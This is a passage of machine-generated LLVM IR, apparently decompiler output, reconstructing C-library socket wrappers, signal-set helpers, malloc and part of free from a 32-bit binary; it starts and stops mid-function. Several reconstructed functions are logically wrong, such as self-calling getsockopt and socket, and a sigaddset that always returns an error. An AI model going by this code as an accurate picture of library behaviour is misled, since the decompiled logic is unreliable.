  %v0_163a8 = phi i32 [ %v5_16388, %entry ], [ -1, %dec_label_pc_16398 ]
  %v2_163ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163ac, i32* @r4, align 4
  ret i32 %v0_163a8

; uselistorder directives
  uselistorder i32 %v5_16388, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163a8, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163b0 = load i32, i32* @r4, align 4
  store i32 %v3_163b0, i32* %stack_var_-8, align 4
  %v5_163b4 = inttoptr i32 %arg3 to i32*
  %v6_163b4 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_163b4)
  store i32 %v6_163b4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_163b4, -4095
  br i1 %tmp, label %dec_label_pc_163d4, label %dec_label_pc_163c4

dec_label_pc_163c4:                               ; preds = %entry
  %v0_163c4 = call i32 @__errno_location()
  %v0_163c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_163c8 = sub i32 0, %v0_163c8
  %v2_163cc = inttoptr i32 %v0_163c4 to i32*
  store i32 %v1_163c8, i32* %v2_163cc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %entry, %dec_label_pc_163c4
  %v0_163d4 = phi i32 [ %v6_163b4, %entry ], [ -1, %dec_label_pc_163c4 ]
  %v2_163d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163d8, i32* @r4, align 4
  ret i32 %v0_163d4

; uselistorder directives
  uselistorder i32 %v6_163b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163d4, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163dc = load i32, i32* @r4, align 4
  store i32 %v3_163dc, i32* %stack_var_-8, align 4
  %v0_163e4 = call i32 @getsockopt()
  store i32 %v0_163e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_163e4, -4095
  br i1 %tmp, label %dec_label_pc_16404, label %dec_label_pc_163f4

dec_label_pc_163f4:                               ; preds = %entry
  %v0_163f4 = call i32 @__errno_location()
  %v0_163f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_163f8 = sub i32 0, %v0_163f8
  %v2_163fc = inttoptr i32 %v0_163f4 to i32*
  store i32 %v1_163f8, i32* %v2_163fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16404

dec_label_pc_16404:                               ; preds = %entry, %dec_label_pc_163f4
  %v0_16404 = phi i32 [ %v0_163e4, %entry ], [ -1, %dec_label_pc_163f4 ]
  %v2_16408 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16408, i32* @r4, align 4
  ret i32 %v0_16404

; uselistorder directives
  uselistorder i32 %v0_163e4, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_16404, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1640c = load i32, i32* @r4, align 4
  store i32 %v3_1640c, i32* %stack_var_-8, align 4
  %v5_16410 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_16410, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16410, -4095
  br i1 %tmp, label %dec_label_pc_16430, label %dec_label_pc_16420

dec_label_pc_16420:                               ; preds = %entry
  %v0_16420 = call i32 @__errno_location()
  %v0_16424 = load i32, i32* %r4.global-to-local, align 4
  %v1_16424 = sub i32 0, %v0_16424
  %v2_16428 = inttoptr i32 %v0_16420 to i32*
  store i32 %v1_16424, i32* %v2_16428, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16430

dec_label_pc_16430:                               ; preds = %entry, %dec_label_pc_16420
  %v0_16430 = phi i32 [ %v5_16410, %entry ], [ -1, %dec_label_pc_16420 ]
  %v2_16434 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16434, i32* @r4, align 4
  ret i32 %v0_16430

; uselistorder directives
  uselistorder i32 %v5_16410, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16430, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16438 = load i32, i32* @r4, align 4
  store i32 %v3_16438, i32* %stack_var_-8, align 4
  %v5_1643c = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_1643c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1643c, -4095
  br i1 %tmp, label %dec_label_pc_1645c, label %dec_label_pc_1644c

dec_label_pc_1644c:                               ; preds = %entry
  %v0_1644c = call i32 @__errno_location()
  %v0_16450 = load i32, i32* %r4.global-to-local, align 4
  %v1_16450 = sub i32 0, %v0_16450
  %v2_16454 = inttoptr i32 %v0_1644c to i32*
  store i32 %v1_16450, i32* %v2_16454, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1645c

dec_label_pc_1645c:                               ; preds = %entry, %dec_label_pc_1644c
  %v0_1645c = phi i32 [ %v5_1643c, %entry ], [ -1, %dec_label_pc_1644c ]
  %v2_16460 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16460, i32* @r4, align 4
  ret i32 %v0_1645c

; uselistorder directives
  uselistorder i32 %v5_1643c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1645c, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16464 = load i32, i32* @r4, align 4
  store i32 %v3_16464, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_16470 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_16470, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16470, -4095
  br i1 %tmp, label %dec_label_pc_16490, label %dec_label_pc_16480

dec_label_pc_16480:                               ; preds = %entry
  %v0_16480 = call i32 @__errno_location()
  %v0_16484 = load i32, i32* %r4.global-to-local, align 4
  %v1_16484 = sub i32 0, %v0_16484
  %v2_16488 = inttoptr i32 %v0_16480 to i32*
  store i32 %v1_16484, i32* %v2_16488, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16490

dec_label_pc_16490:                               ; preds = %entry, %dec_label_pc_16480
  %v0_16490 = phi i32 [ %v5_16470, %entry ], [ -1, %dec_label_pc_16480 ]
  %v2_16494 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16494, i32* @r4, align 4
  ret i32 %v0_16490

; uselistorder directives
  uselistorder i32 %v5_16470, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16490, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16498 = load i32, i32* @r4, align 4
  store i32 %v3_16498, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_164a0 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_164a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_164a0, -4095
  br i1 %tmp, label %dec_label_pc_164c0, label %dec_label_pc_164b0

dec_label_pc_164b0:                               ; preds = %entry
  %v0_164b0 = call i32 @__errno_location()
  %v0_164b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_164b4 = sub i32 0, %v0_164b4
  %v2_164b8 = inttoptr i32 %v0_164b0 to i32*
  store i32 %v1_164b4, i32* %v2_164b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164c0

dec_label_pc_164c0:                               ; preds = %entry, %dec_label_pc_164b0
  %v0_164c0 = phi i32 [ %v5_164a0, %entry ], [ -1, %dec_label_pc_164b0 ]
  %v2_164c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_164c4, i32* @r4, align 4
  ret i32 %v0_164c0

; uselistorder directives
  uselistorder i32 %v5_164a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164c0, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164c8 = load i32, i32* @r4, align 4
  store i32 %v3_164c8, i32* %stack_var_-8, align 4
  %v0_164cc = call i32 @socket()
  store i32 %v0_164cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164cc, -4095
  br i1 %tmp, label %dec_label_pc_164ec, label %dec_label_pc_164dc

dec_label_pc_164dc:                               ; preds = %entry
  %v0_164dc = call i32 @__errno_location()
  %v0_164e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_164e0 = sub i32 0, %v0_164e0
  %v2_164e4 = inttoptr i32 %v0_164dc to i32*
  store i32 %v1_164e0, i32* %v2_164e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164ec

dec_label_pc_164ec:                               ; preds = %entry, %dec_label_pc_164dc
  %v0_164ec = phi i32 [ %v0_164cc, %entry ], [ -1, %dec_label_pc_164dc ]
  %v2_164f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_164f0, i32* @r4, align 4
  ret i32 %v0_164ec

; uselistorder directives
  uselistorder i32 %v0_164cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164ec, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_16510, label %dec_label_pc_16500

dec_label_pc_16500:                               ; preds = %entry
  %v8_16504 = icmp sgt i32 %arg1, 64
  br i1 %v8_16504, label %dec_label_pc_16510, label %dec_label_pc_16508

dec_label_pc_16508:                               ; preds = %dec_label_pc_16500
  %v0_1650c = call i32 @__sigaddset()
  br label %dec_label_pc_16510

dec_label_pc_16510:                               ; preds = %dec_label_pc_16500, %entry, %dec_label_pc_16508
  %v0_16510 = call i32 @__errno_location()
  %v2_16518 = inttoptr i32 %v0_16510 to i32*
  store i32 22, i32* %v2_16518, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16510, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_16530 = load i32, i32* @r0, align 4
  %v2_16530 = inttoptr i32 %v0_16530 to i8*
  %v3_16530 = call i32 @__GI_memset(i8* %v2_16530, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1653c = load i32, i32* @r4, align 4
  store i32 %v3_1653c, i32* %stack_var_-12, align 4
  %v6_1653c = load i32, i32* @r5, align 4
  %v10_1653c = ptrtoint i32* %stack_var_-12 to i32
  %v7_16540 = icmp eq i32 %arg2, -1
  %v0_1654c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_16540, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_16564

bb:                                               ; preds = %entry
  %v2_16548 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_1654c.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_1654c.pre, 1
  br i1 %tmp19, label %dec_label_pc_16564, label %dec_label_pc_16554

dec_label_pc_16554:                               ; preds = %bb
  %v7_16558 = icmp sgt i32 %v0_1654c.pre, 64
  br i1 %v7_16558, label %dec_label_pc_16564, label %bb20

bb20:                                             ; preds = %dec_label_pc_16554
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_1658824 = add i32 %v10_1653c, 124
  store i32 %v5_1658824, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16578

dec_label_pc_16564:                               ; preds = %.thread, %dec_label_pc_16554, %bb
  %v0_16564 = call i32 @__errno_location()
  store i32 %v0_16564, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16570 = inttoptr i32 %v0_16564 to i32*
  store i32 22, i32* %v2_16570, align 4
  %v0_165e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_165e4

dec_label_pc_16578:                               ; preds = %bb20, %dec_label_pc_16578
  %v5_1658825 = phi i32 [ %v5_1658824, %bb20 ], [ %v5_16588, %dec_label_pc_16578 ]
  %v2_1657c = add i32 %v5_1658825, -136
  %v3_1657c = inttoptr i32 %v2_1657c to i32*
  store i32 0, i32* %v3_1657c, align 4
  %v0_16580.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_16580 = add i32 %v0_16580.pre, -1
  store i32 %v1_16580, i32* %r0.global-to-local, align 4
  %v6_16580 = icmp slt i32 %v1_16580, 0
  %v4_16588 = mul i32 %v1_16580, 4
  %v5_16588 = add i32 %v4_16588, %v10_1653c
  store i32 %v5_16588, i32* %r2.global-to-local, align 4
  br i1 %v6_16580, label %dec_label_pc_16590, label %dec_label_pc_16578

dec_label_pc_16590:                               ; preds = %dec_label_pc_16578
  %v2_16590 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_16590, i32* @r5, align 4
  %v2_16594 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_16594, i32* @r0, align 4
  %v0_16598 = load i32, i32* @r4, align 4
  store i32 %v0_16598, i32* @r1, align 4
  %v0_1659c = call i32 @__sigaddset()
  store i32 %v0_1659c, i32* %r0.global-to-local, align 4
  %v1_165a0 = icmp slt i32 %v0_1659c, 0
  br i1 %v1_165a0, label %dec_label_pc_165e0, label %dec_label_pc_165a8

dec_label_pc_165a8:                               ; preds = %dec_label_pc_16590
  %v0_165a8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2eecc.983 to i32), i32* %r0.global-to-local, align 4
  %v2_165b0 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_2eecc.983 to i32), i32 %v0_165a8)
  store i32 %v2_16548, i32* %r2.global-to-local, align 4
  %v0_165c8 = load i32, i32* @r4, align 4
  store i32 %v0_165c8, i32* %r0.global-to-local, align 4
  %v4_165d0 = call i32 @__libc_sigaction(i32 %v0_165c8, i32* nonnull %stack_var_-152, i32 %v2_16548)
  store i32 %v4_165d0, i32* %r0.global-to-local, align 4
  %v1_165d4 = icmp slt i32 %v4_165d0, 0
  br i1 %v1_165d4, label %dec_label_pc_165e0, label %bb23

bb23:                                             ; preds = %dec_label_pc_165a8
  %v5_165d8 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_165d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_165e4

dec_label_pc_165e0:                               ; preds = %dec_label_pc_165a8, %dec_label_pc_16590
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_165e4

dec_label_pc_165e4:                               ; preds = %bb23, %dec_label_pc_16564, %dec_label_pc_165e0
  %v0_165e4 = phi i32 [ %v5_165d8, %bb23 ], [ %v0_165e4.pre, %dec_label_pc_16564 ], [ -1, %dec_label_pc_165e0 ]
  store i32 %v0_165e4, i32* %r0.global-to-local, align 4
  %v2_165ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_165ec, i32* @r4, align 4
  store i32 %v6_1653c, i32* @r5, align 4
  ret i32 %v0_165e4

; uselistorder directives
  uselistorder i32 %v0_165e4, { 1, 0 }
  uselistorder i32 %v5_16588, { 1, 0 }
  uselistorder i32 %v1_16580, { 0, 2, 1 }
  uselistorder i32 %v2_16548, { 1, 0 }
  uselistorder i32 %v0_1654c.pre, { 1, 0, 2 }
  uselistorder i32 %v10_1653c, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_165e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16578, { 1, 0 }
  uselistorder label %dec_label_pc_16564, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_165f4 = add i32 %arg2, -1
  %v3_165f8 = udiv i32 %v1_165f4, 32
  %v4_165fc = mul nuw nsw i32 %v3_165f8, 4
  %v5_165fc = add i32 %v4_165fc, %arg1
  %v6_165fc = inttoptr i32 %v5_165fc to i32*
  %v7_165fc = load i32, i32* %v6_165fc, align 4
  %v1_16600 = urem i32 %v1_165f4, 32
  %v7_16608 = shl i32 1, %v1_16600
  %v8_16608 = and i32 %v7_165fc, %v7_16608
  %v10_16608 = icmp ne i32 %v8_16608, 0
  %. = zext i1 %v10_16608 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_165f4, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_16618 = load i32, i32* @r1, align 4
  %v1_16618 = add i32 %v0_16618, -1
  %v3_1661c = udiv i32 %v1_16618, 32
  %v0_16620 = load i32, i32* @r0, align 4
  %v4_16620 = mul nuw nsw i32 %v3_1661c, 4
  %v5_16620 = add i32 %v0_16620, %v4_16620
  %v6_16620 = inttoptr i32 %v5_16620 to i32*
  %v7_16620 = load i32, i32* %v6_16620, align 4
  %v1_16624 = urem i32 %v1_16618, 32
  %v7_1662c = shl i32 1, %v1_16624
  %v8_1662c = or i32 %v7_16620, %v7_1662c
  store i32 %v8_1662c, i32* %v6_16620, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16618, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1663c = add i32 %arg2, -1
  %v3_16640 = udiv i32 %v1_1663c, 32
  %v4_16644 = mul nuw nsw i32 %v3_16640, 4
  %v5_16644 = add i32 %v4_16644, %arg1
  %v6_16644 = inttoptr i32 %v5_16644 to i32*
  %v7_16644 = load i32, i32* %v6_16644, align 4
  %v1_16648 = urem i32 %v1_1663c, 32
  %tmp = shl i32 -1, %v1_16648
  %v8_16650 = add i32 %tmp, -1
  %v9_16650 = and i32 %v7_16644, %v8_16650
  store i32 %v9_16650, i32* %v6_16644, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1663c, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16660 = load i32, i32* @r4, align 4
  %v6_16660 = load i32, i32* @r5, align 4
  %v9_16660 = load i32, i32* @r6, align 4
  %v0_16664 = load i32, i32* %r0.global-to-local, align 4
  %v2_16664 = icmp eq i32 %v0_16664, 0
  %v2_16668 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_16664, label %bb, label %dec_label_pc_16674

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1667c

dec_label_pc_16674:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_16664, -8
  br i1 %tmp, label %dec_label_pc_16780, label %dec_label_pc_1667c

dec_label_pc_1667c:                               ; preds = %bb, %dec_label_pc_16674
  %v0_1667c = phi i32 [ %v0_16664, %dec_label_pc_16674 ], [ 1, %bb ]
  %v1_1667c = add i32 %v0_1667c, 4
  store i32 %v1_1667c, i32* %stack_var_-20, align 4
  store i32 %v2_16668, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2ee5c.985 to i32), i32* %r0.global-to-local, align 4
  %v1_16694 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_28a10.989 to i32), i32* %r0.global-to-local, align 4
  %v3_166a0 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_28a10.989 to i32*), i32 %v2_16668)
  store i32 %v3_166a0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2ee5c.985 to i32), i32* %r0.global-to-local, align 4
  store i32 91832, i32* @lr, align 4
  %v1_166b4 = call i32 @__pthread_return_0()
  store i32 %v1_166b4, i32* %r0.global-to-local, align 4
  %v2_166b8 = icmp eq i32 %v3_166a0, 0
  br i1 %v2_166b8, label %dec_label_pc_166c0, label %dec_label_pc_16770

dec_label_pc_166c0:                               ; preds = %dec_label_pc_1667c
  %v2_166c4 = load i32, i32* @global_var_2ee84.992, align 4
  store i32 %v2_166c4, i32* @r4, align 4
  %v2_166c8 = load i32, i32* %stack_var_-20, align 4
  %v3_166cc = icmp ult i32 %v2_166c8, %v2_166c4
  br i1 %v3_166cc, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_166c0
  %v3_166d0 = add i32 %v2_166c4, -1
  %v2_166d4 = add i32 %v3_166d0, %v2_166c8
  %v2_166d8 = sub i32 0, %v2_166c4
  %v3_166dc = and i32 %v2_166d4, %v2_166d8
  store i32 %v3_166dc, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_166c0, %bb14
  store i32 ptrtoint (i32* @global_var_2ef4c.994 to i32), i32* %r0.global-to-local, align 4
  %v1_166e8 = call i32 @__pthread_return_0()
  %v0_166ec = load i32, i32* @r4, align 4
  store i32 %v0_166ec, i32* %r0.global-to-local, align 4
  %v1_166f0 = call i32 @__GI_sbrk(i32 %v0_166ec)
  store i32 %v1_166f0, i32* %r0.global-to-local, align 4
  %v7_166f4 = icmp eq i32 %v1_166f0, -1
  br i1 %v7_166f4, label %bb15, label %dec_label_pc_16700

bb15:                                             ; preds = %.thread3
  store i32 %v1_166f0, i32* @r5, align 4
  br label %dec_label_pc_16714

dec_label_pc_16700:                               ; preds = %.thread3
  %v1_16700 = add i32 %v1_166f0, 3
  %v1_16704 = and i32 %v1_16700, -4
  store i32 %v1_16704, i32* @r5, align 4
  %v9_16708 = icmp eq i32 %v1_16704, %v1_166f0
  br i1 %v9_16708, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_16700
  %v3_1670c = sub i32 %v1_16704, %v1_166f0
  store i32 %v3_1670c, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_16700, %bb16
  %v1_16710 = xor i1 %v9_16708, true
  call void @__pseudo_cond_branch(i1 %v1_16710, i32 ptrtoint (i32* @global_var_17bc4.995 to i32))
  br label %dec_label_pc_16714

dec_label_pc_16714:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_2ef4c.994 to i32), i32* %r0.global-to-local, align 4
  store i32 91940, i32* @lr, align 4
  %v1_16720 = call i32 @__pthread_return_0()
  store i32 %v1_16720, i32* %r0.global-to-local, align 4
  %v0_16724 = load i32, i32* @r5, align 4
  %v7_16724 = icmp eq i32 %v0_16724, -1
  br i1 %v7_16724, label %dec_label_pc_16780, label %dec_label_pc_1672c

dec_label_pc_1672c:                               ; preds = %dec_label_pc_16714
  store i32 ptrtoint (i32* @global_var_2ee5c.985 to i32), i32* %r0.global-to-local, align 4
  %v1_16738 = call i32 @__pthread_return_0()
  %v0_1673c = load i32, i32* @r4, align 4
  %v0_16740 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_28a10.989 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_16740, 16777216
  %v2_16748 = sdiv i32 %sext, 16777216
  %v5_16748 = call i32 @__heap_free(i32* bitcast (i32** @global_var_28a10.989 to i32*), i32 %v2_16748, i32 %v0_1673c)
  store i32 ptrtoint (i32** @global_var_28a10.989 to i32), i32* %r0.global-to-local, align 4
  %v3_16754 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_28a10.989 to i32*), i32 %v2_16668)
  store i32 %v3_16754, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2ee5c.985 to i32), i32* %r0.global-to-local, align 4
  store i32 92008, i32* @lr, align 4
  %v1_16764 = call i32 @__pthread_return_0()
  store i32 %v1_16764, i32* %r0.global-to-local, align 4
  %v2_16768 = icmp eq i32 %v3_16754, 0
  br i1 %v2_16768, label %dec_label_pc_16780, label %dec_label_pc_16770

dec_label_pc_16770:                               ; preds = %dec_label_pc_1667c, %dec_label_pc_1672c
  %v1_16774 = phi i32 [ %v3_166a0, %dec_label_pc_1667c ], [ %v3_16754, %dec_label_pc_1672c ]
  %v2_16770 = load i32, i32* %stack_var_-20, align 4
  %v2_16774 = inttoptr i32 %v1_16774 to i32*
  store i32 %v2_16770, i32* %v2_16774, align 4
  %v3_16774 = load i32, i32* %r4.global-to-local, align 4
  %v4_16774 = add i32 %v3_16774, 4
  store i32 %v4_16774, i32* %r4.global-to-local, align 4
  %v2_16778 = icmp eq i32 %v4_16774, 0
  br i1 %v2_16778, label %dec_label_pc_16780, label %dec_label_pc_16790

dec_label_pc_16780:                               ; preds = %dec_label_pc_16770, %dec_label_pc_1672c, %dec_label_pc_16714, %dec_label_pc_16674
  %v0_16780 = call i32 @__errno_location()
  store i32 %v0_16780, i32* %r0.global-to-local, align 4
  %v2_16788 = inttoptr i32 %v0_16780 to i32*
  store i32 12, i32* %v2_16788, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16790

dec_label_pc_16790:                               ; preds = %dec_label_pc_16770, %dec_label_pc_16780
  %v0_16790 = phi i32 [ %v4_16774, %dec_label_pc_16770 ], [ 0, %dec_label_pc_16780 ]
  store i32 %v0_16790, i32* %r0.global-to-local, align 4
  store i32 %v3_16660, i32* @r4, align 4
  store i32 %v6_16660, i32* @r5, align 4
  store i32 %v9_16660, i32* @r6, align 4
  ret i32 %v0_16790

; uselistorder directives
  uselistorder i32 %v0_16790, { 1, 0 }
  uselistorder i32 %v3_16754, { 1, 0, 2 }
  uselistorder i32 %v1_16704, { 1, 0, 2 }
  uselistorder i32 %v1_166f0, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_166a0, { 1, 0, 2 }
  uselistorder i32 %v0_16664, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 3, 12, 11, 16, 14, 13, 2, 15, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_16790, { 1, 0 }
  uselistorder label %dec_label_pc_16770, { 1, 0 }
  uselistorder label %dec_label_pc_16714, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1667c, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_167b4 = icmp eq i32 %arg1, 0
  %v3_167b8 = load i32, i32* @r4, align 4
  store i32 %v3_167b8, i32* %stack_var_-24, align 4
  %v6_167b8 = load i32, i32* @r5, align 4
  %v9_167b8 = load i32, i32* @r6, align 4
  %v15_167b8 = load i32, i32* @r8, align 4
  br i1 %v2_167b4, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_167c0 = add i32 %arg1, -4
  %v2_167c0 = inttoptr i32 %v1_167c0 to i32*
  %v3_167c0 = load i32, i32* %v2_167c0, align 4
  store i32 %v3_167c0, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_28a10.989 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_167c0, i32* @r4, align 4
  %v1_167d8 = call i32 @__pthread_return_0()
  %v0_167dc = load i32, i32* @r4, align 4
  %v0_167e0 = load i32, i32* @r5, align 4
  %v4_167e8 = call i32 @__heap_free(i32* bitcast (i32** @global_var_28a10.989 to i32*), i32 %v0_167dc, i32 %v0_167e0)
  %v1_167f0 = inttoptr i32 %v4_167e8 to i32*
  %v2_167f0 = load i32, i32* %v1_167f0, align 4
  store i32 %v2_167f0, i32* %r6.global-to-local, align 4
  %v2_167f4 = load i32, i32* @global_var_2ee84.992, align 4
  %v4_167f8 = mul i32 %v2_167f4, 8
  %v6_167f8 = icmp ult i32 %v2_167f0, %v4_167f8
  store i32 %v4_167e8, i32* @r4, align 4
  br i1 %v6_167f8, label %dec_label_pc_16838, label %dec_label_pc_16804

